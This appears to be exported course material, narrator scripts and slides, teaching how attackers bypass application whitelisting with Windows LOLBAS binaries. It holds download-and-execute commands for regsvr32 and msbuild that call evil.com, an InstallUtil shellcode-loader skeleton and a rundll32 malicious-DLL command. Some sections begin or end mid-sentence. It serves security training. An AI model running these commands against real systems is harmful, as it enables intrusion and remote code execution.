screens.title: Understanding Application Whitelisting (AWL)
screens.narratorSegment: Let's begin by clearly defining Application Whitelisting, or AWL. At its core, AWL is a security control that operates on a principle of explicit trust. Instead of trying to identify and block known bad executables, like traditional antivirus software does, AWL maintains a list of only approved applications. If an application is not on this whitelist, it is simply not allowed to run. This 'deny by default' approach makes AWL incredibly powerful. Imagine a scenario where a new, unknown piece of malware, a zero-day exploit, attempts to execute on a system. If that malware isn't on the approved whitelist, it will be blocked immediately, regardless of whether its signature is known to an antivirus. This proactive stance significantly reduces an organization's attack surface and provides a strong defense against novel threats. The key takeaway here is that AWL shifts the security paradigm from reactive detection to proactive prevention, making it a formidable barrier for attackers. However, no defense is impenetrable, and understanding its strengths is the first step to finding its weaknesses. Understanding Application Whitelisting (AWL) means application whitelisting only permits explicitly approved applications to run, blocking all others by default, offering strong protection against unknown threats.. In practical terms, a proactive defense mechanism. A concrete example makes the pattern visible, and a brief contrast helps prevent a common misconception. This matters because learners need the underlying reasoning before they can apply the idea confidently or notice where it breaks down. The main takeaway is that the concept should be understood as a meaningful pattern, not just a label on the screen.

content.html:
Module X›Chapter Y›Understanding AWL
Core Concept

Understanding Application Whitelisting (AWL)

A Proactive Defense Mechanism

Definition

Application Whitelisting (AWL) is a security control that permits only explicitly approved applications to execute on a system, blocking all others by default.

How it Works

Unlike antivirus (blacklist), AWL uses a whitelist. If an executable isn't on the approved list, it simply won't run, regardless of whether it's known malware.

Key Takeaway

AWL significantly reduces the attack surface by preventing unknown malware and zero-day exploits from executing, shifting security from reactive to proactive.

AWL vs. Antivirus: A Paradigm Shift

Antivirus (Blacklisting)

Blocks known bad executables based on signatures. Reactive defense.

AWL (Whitelisting)

Allows only explicitly approved applications. Proactive defense.

Example Scenario

A zero-day malware attempts to run. Antivirus might miss it. AWL blocks it because it's not on the approved list, regardless of its signature.

screens.title: Living Off The Land Binaries and Scripts (LOLBAS)
screens.narratorSegment: Now that we understand Application Whitelisting, let's dive into the primary method for bypassing it: Living Off The Land Binaries and Scripts, or LOLBAS. This methodology is a cornerstone of modern offensive security. The core idea is simple yet incredibly effective: instead of introducing new, potentially detectable malicious executables onto a target system, we abuse legitimate, signed, and typically whitelisted binaries or scripts that are already present. Think of it this way: the operating system and the AWL policy already trust these tools, so they are allowed to execute without raising immediate red flags. We then leverage their built-in functionality to perform our malicious actions, such as executing arbitrary code, downloading files, or achieving persistence. A fantastic resource for exploring these binaries is the LOLBAS Project, found at lolbas-project. github. io. This project meticulously documents various legitimate Windows binaries and scripts that can be abused, categorizing them by their malicious capabilities. The power of LOLBAS lies in its stealth; by using tools that are part of the system's normal operation, we can often achieve our objectives while remaining under the radar of many security controls. This technique highlights the importance of understanding not just what's allowed, but how those allowed components can be misused.

Module X›Chapter Y›Introducing LOLBAS
Core Methodology

Living Off The Land Binaries and Scripts (LOLBAS)

Abusing Trusted System Tools

Definition

LOLBAS involves using legitimate, signed, and whitelisted binaries or scripts already present on a target system to perform malicious actions, bypassing security controls.

Why it Works

Since these binaries are trusted by the OS and AWL policy, they are allowed to execute, enabling attackers to achieve objectives without introducing new, unauthorized executables.

Key Takeaway

LOLBAS leverages the inherent trust in system tools, making it a stealthy and effective method for bypassing AWL and other security defenses.

The LOLBAS Principle: Trust Exploitation

Target System

Whitelisted Binaries & Scripts

Legitimate Binary (e.g., `regsvr32`)

Abused for Malicious Action

Achieve Objective

Code Execution, Persistence, etc.

Resource Highlight

The LOLBAS Project (lolbas-project.github.io) is an invaluable, community-driven resource for discovering and understanding these abusable binaries.

screens.title: Abusing `regsvr32.exe` for Code Execution
screens.narratorSegment: Our first practical LOLBAS example involves regsvr32. exe, a legitimate Windows utility. Normally, regsvr32 is used to register and unregister DLLs and ActiveX controls, which is a standard system operation. However, it possesses a powerful, abusable feature: the ability to download and execute scriptlets from a remote server. This is achieved by pointing regsvr32 to a URL containing a. sct file, which is a scriptlet file. The scrobj. dll library then handles the execution of the script embedded within that. sct file. The command we use includes several flags: slash s for silent mode, slash u to unregister (which is often a red herring to make it seem less suspicious), slash n to prevent calling DllRegisterServer, and crucially, slash i. URL to specify our malicious scriptlet. This means that if regsvr32. exe is whitelisted, which it almost always is, we can leverage it to fetch and run arbitrary code from our attacker-controlled server, effectively bypassing AWL. This technique is particularly potent because it uses a trusted binary to initiate a network connection and execute code, making it difficult for basic AWL policies to detect.

keyIdea.text: By using `regsvr32.exe` with the `/i:URL` parameter, attackers can download and execute malicious scriptlet files from remote servers, bypassing AWL.

content.html:
Module X›Chapter Y›`regsvr32.exe` Bypass
LOLBAS Technique

Abusing `regsvr32.exe` for Code Execution

Registering Malicious Scriptlets

regsvr32 /s /u /n /i:http://evil.com/file.sct scrobj.dll
Command Explained

`regsvr32` is a Windows utility for DLL registration. Here, it's used to download and execute a remote scriptlet.

`/i:URL` Parameter

Crucially, this specifies a URL to a scriptlet file (`.sct`) that `regsvr32` will download and execute via `scrobj.dll`.

Silent Execution

`/s` (silent mode) and `/u` (unregister) help to make the execution less conspicuous, though `/u` is often a red herring.

Key Takeaway

`regsvr32` is a powerful LOLBAS because it's whitelisted and can fetch/execute arbitrary code from remote sources, bypassing AWL.

How `regsvr32` Bypass Works

1.

Attacker hosts malicious `.sct` file on a web server.

2.

Victim executes `regsvr32` command with `/i:URL` pointing to `.sct`.

3.

`regsvr32` downloads the `.sct` file.

4.

`scrobj.dll` processes and executes the script within the `.sct` file.

Common Misconception

The `/u` flag doesn't mean it's harmless. It just tells `regsvr32` to unregister, but the scriptlet execution still occurs during the process.

screens.title: Leveraging `msbuild.exe` with Malicious Project Files
screens.narratorSegment: Next, let's explore msbuild. exe, the Microsoft Build Engine. This is a legitimate and signed binary used by developers to build applications from project files like. csproj or. vbproj. The power for an attacker lies in the fact that these XML project files can contain inline C# or Visual Basic code. This means we can craft a seemingly innocuous XML project file that, when processed by msbuild. exe, actually executes arbitrary malicious code. For example, you could embed C# code that launches a Meterpreter shell or downloads and executes a PowerShell script. Since msbuild. exe is a trusted Microsoft binary, it's typically whitelisted by AWL policies. When you execute your malicious. csproj file using msbuild. exe, the AWL sees a trusted binary running, but the embedded code within the project file is what performs the malicious action. This technique is highly effective because it leverages the build process itself to execute code, making it a sophisticated bypass. The example provided shows how to embed a PowerShell command to download and execute a remote script, demonstrating the flexibility of this method. Understanding msbuild's role in the development lifecycle helps us appreciate why it's such a potent tool for bypassing security controls.

content.html:
Module X›Chapter Y›`msbuild.exe` Bypass
LOLBAS Technique

Leveraging `msbuild.exe` with Malicious Project Files

Executing Inline C# or VB Code

<!-- Malicious .csproj file -->
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="Hello">
    <Exec Command="powershell.exe -c 'IEX (New-Object Net.WebClient).DownloadString(\"http://evil.com/shell.ps1\")'" />
  </Target>
</Project>
# Then execute:
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe /nologo /verbosity:q /target:Hello C:\Users\Public\malicious.csproj
Key Takeaway

`msbuild.exe` is a signed Microsoft binary, making it a powerful AWL bypass. It executes embedded code within trusted project files, allowing for arbitrary code execution.

`msbuild` Bypass Flow

1.

Attacker crafts malicious `.csproj` with embedded C# / VB code.

2.

Places `.csproj` on target system (e.g., `C:\Users\Public`).

3.

Executes `msbuild.exe` pointing to the malicious `.csproj` file.

4.

`msbuild.exe` processes the file and executes the embedded code.

Pro Tip

The embedded code can be anything from a simple command to a complex reverse shell, making this a highly versatile technique.

NET assembly, typically a C# or Visual Basic compiled executable, that contains our arbitrary code within its Install method. When Install Util. exe is then directed to this specially crafted assembly, it will execute the Install method, thereby running our malicious code. This technique is particularly effective because Install Util. exe is a signed Microsoft binary and is often whitelisted. It allows us to execute complex. NET code directly on the target system without needing to introduce an untrusted executable. The key here is understanding that the. NET framework provides a rich environment for code execution, and utilities like Install Util expose entry points that can be repurposed for offensive operations. This method demonstrates the versatility of LOLBAS, extending beyond simple script execution to full-fledged compiled code.

`InstallUtil.exe` for .NET Code Execution

Custom Installer Components as Payloads

// Example C# code for a custom installer that runs shellcode
using System.Configuration.Install;
using System.Runtime.InteropServices;

[System.ComponentModel.RunInstaller(true)]
public class Sample : System.Configuration.Install.Installer
{
    public override void Install(System.Collections.IDictionary savedState)
    {
        // Your shellcode here
        byte[] shellcode = new byte[] { 0xfc, 0x48, 0x83, ... };
        // Code to allocate memory, copy shellcode, and execute
    }
}
# Compile this into an EXE, then execute:
InstallUtil.exe /logfile= /LogToConsole=false /U C:\Users\Public\malicious.exe
Key Takeaway

`InstallUtil.exe` can execute arbitrary .NET code by pointing it to a specially crafted .NET assembly, making it a versatile AWL bypass for .NET environments.

`InstallUtil` Bypass Flow

1.

Attacker develops a .NET assembly with malicious code in its `Install` method.

2.

Compiles the code into an executable (e.g., `malicious.exe`).

3.

Places the malicious assembly on the target system.

4.

Executes `InstallUtil.exe` pointing to the malicious assembly, triggering the `Install` method.

Pro Tip

The `/U` flag (uninstall) is often used to execute the `Install` method, as it's part of the installation/uninstallation lifecycle.

screens.title: Executing DLL Functions with `rundll32.exe`
screens.narratorSegment: Our final specific LOLBAS example is rundll32. exe, a utility designed to run a function from a specified DLL. While its primary use is for legitimate system operations, it can be easily abused to execute functions from malicious DLLs. The command structure for rundll32 is straightforward: you specify the DLL path, followed by a comma, and then the entry point function you want to execute within that DLL. For instance, you could point rundll32 to a malicious DLL that you've managed to place on the system, and then call an exported function within it that performs your desired malicious action, such as launching a shell or injecting code. It's important to note that while the example shows a local DLL, rundll32 can also be combined with other techniques, like using mshta. exe or JavaScript, to download and then execute remote DLLs. Since rundll32. exe is a core Windows component, it's almost always whitelisted, making it a reliable vector for code execution. The key takeaway here is that rundll32 provides a direct interface to execute code within DLLs, and by controlling the DLL, we control the execution. This flexibility makes it a valuable tool in an attacker's arsenal for bypassing AWL.

content.html:
Module X›Chapter Y›`rundll32.exe` Bypass
LOLBAS Technique

Executing DLL Functions with `rundll32.exe`

Running Malicious DLLs

rundll32.exe C:\Windows\System32\shell32.dll,Control_RunDLL C:\Users\Public\malicious.dll,EntryPoint
Command Explained

`rundll32` executes a specified function from a DLL. Here, it's used to call `Control_RunDLL` from `shell32.dll` to then load and execute a function from `malicious.dll`.

Malicious DLL

The `malicious.dll` contains the attacker's code, and `EntryPoint` is the function within it that `rundll32` is instructed to execute.

Combined Techniques

1.

Attacker creates a malicious DLL with an exported function.

2.

Places the DLL on the target system (or uses a download method).

3.

Executes `rundll32.exe` specifying the DLL path and function name.

4.

`rundll32` loads the DLL and executes the specified malicious function.

Think of `rundll32` as a remote control for DLLs. If you can swap out the battery (the DLL) with a malicious one, the remote control (rundll32) will still function, but with a different outcome.

screens.title: Common AWL Misconfigurations
screens.narratorSegment: Beyond abusing specific binaries, attackers can also exploit common misconfigurations and weaknesses in AWL implementations. One significant vulnerability arises with unsigned scripts. Some AWL policies are configured to only whitelist signed executables, but they might inadvertently allow unsigned scripts, such as PowerShell or VBScript, to run from certain trusted locations. If an attacker can place their malicious script in one of these whitelisted directories, the system will execute it without question, effectively bypassing the AWL. This highlights a critical policy gap: focusing solely on executables while neglecting script interpreters. Another common weakness involves trusted directories. AWL policies often whitelist entire directories, such as C. backslash Windows backslash Temp or C. backslash Program Data, assuming that only legitimate software will write to these locations. However, if an attacker gains write access to one of these trusted directories, they can simply place their malicious executable or script there. Since the directory itself is whitelisted, the malicious file will be allowed to run. This is a classic example of how overly broad permissions or assumptions in policy design can create significant security holes. Both of these misconfigurations demonstrate that even robust security controls like AWL require careful and comprehensive implementation to be truly effective.

Exploiting Weaknesses

Common AWL Misconfigurations

Unsigned Scripts and Trusted Directories

Unsigned Scripts

Some AWL policies whitelist signed executables but allow unsigned scripts (e.g., PowerShell, VBScript) to run from certain trusted locations. Attackers can place malicious scripts here.

Impact

Allows execution of arbitrary script code if the script interpreter is whitelisted and the script is placed in an allowed path.

Trusted Directories

AWL policies often whitelist entire directories (e.g., `C:\Windows\Temp`, `C:\ProgramData`). If an attacker can write to these, their malicious executables will run.

Impact

Any malicious file placed in a whitelisted directory will be allowed to execute, bypassing the AWL policy entirely.

Key Takeaway

AWL policies must be meticulously configured to avoid gaps. Overlooking script types or broadly whitelisting directories creates easy bypass opportunities for attackers.

screens.title: Advanced AWL Weaknesses
screens.narratorSegment: Beyond basic misconfigurations, more advanced weaknesses can also undermine AWL. One such technique is DLL Sideloading. This occurs when a legitimate, whitelisted application attempts to load a Dynamic Link Library, or DLL, from an insecure path, such as the current working directory, before it looks in the secure system directories. An attacker can exploit this by placing a malicious DLL with the same name as a legitimate one in that insecure path. When the whitelisted application starts, it will load and execute the malicious DLL instead of the intended system DLL. This is a powerful technique because it leverages the trust placed in the legitimate application to execute unauthorized code. Another critical weakness stems from complex policy gaps. Enterprise AWL policies can become incredibly intricate, with numerous rules, exceptions, and conditions. This complexity often leads to unintended gaps, where specific executables or script interpreters might be allowed to run with overly broad permissions. These gaps can be difficult to spot during policy review but can be a goldmine for attackers. For example, a policy might allow a specific utility to run with administrative privileges, and if that utility has a known LOLBAS vulnerability, it becomes a direct path to privilege escalation and AWL bypass. Both DLL sideloading and complex policy gaps underscore the need for continuous auditing and a deep understanding of how applications interact with the operating system and security policies.

Advanced AWL Weaknesses

DLL Sideloading and Policy Gaps

DLL Sideloading

A whitelisted application loads a DLL from an insecure path (e.g., current working directory) before system directories. An attacker places a malicious DLL with the same name in that path.

Impact

The legitimate application loads and executes the malicious DLL, bypassing AWL by leveraging the application's trust.

Policy Gaps

Complex AWL policies can have unintended gaps, allowing specific executables or script interpreters to run with overly broad permissions, creating bypass opportunities.

Impact

Attackers can exploit these gaps to execute unauthorized code or escalate privileges, as the allowed binary is already trusted.

Advanced AWL bypasses often involve exploiting the intricate ways applications load components or uncovering subtle flaws in complex policy configurations. Continuous vigilance is key.

screens.title: Discovering New LOLBAS & Safety Notes
screens.narratorSegment: Mastering AWL bypass isn't just about knowing existing techniques; it's also about developing strategies to discover new LOLBAS entries. Your primary resource should always be the LOLBAS Project website, which is constantly updated with new findings and categorizes binaries by their malicious capabilities. Beyond that, you should actively analyze system binaries on target systems. Enumerate all executables in critical directories like C. backslash Windows backslash System32 and C. backslash Windows backslash Sys WOW64, then research their legitimate functions to identify potential abuse cases. Monitoring process execution in a lab environment using tools like Sysmon can also reveal unusual command-line arguments or child processes that indicate a LOLBAS opportunity. Finally, setting up a lab with Microsoft's AppLocker, their AWL implementation, allows you to experiment and test different binaries and scripts to see what is allowed and what is blocked. However, with great power comes great responsibility. Always remember that AWL policies vary, and what works in one environment might not work in another. Crucially, never test these techniques on production systems without explicit, written authorization. Misuse can lead to system instability or severe security breaches. Also, be mindful of cleaning up artifacts and the fact that while the binary might be whitelisted, the command-line arguments are often logged by EDR systems, potentially leading to detection. Ethical practice and continuous learning are paramount in this field.

Expanding Your Toolkit Responsibly

Strategies for Discovery

Common Mistakes & Safety Notes

  • AWL policies vary: What works against one might not work against another.
  • Clean up artifacts: Malicious files fed to LOLBAS binaries remain on disk.
  • Command-line logging: EDRs often log arguments, even for whitelisted binaries.
  • Authorization is key: Never test on production systems without explicit, written permission.

Misuse can lead to system instability or security breaches. Always act ethically.

Mastering AWL bypass requires continuous research, responsible testing, and an understanding that effectiveness varies based on specific policy implementations and EDR capabilities.

Finally, we touched upon DLL Sideloading, an attack where a legitimate application loads a malicious DLL from an insecure path instead of the intended system DLL. This concept underscores the importance of secure application loading. These techniques collectively illustrate the diverse ways attackers can operate within the confines of a whitelisted environment, turning legitimate tools into potent weapons for bypassing security controls.
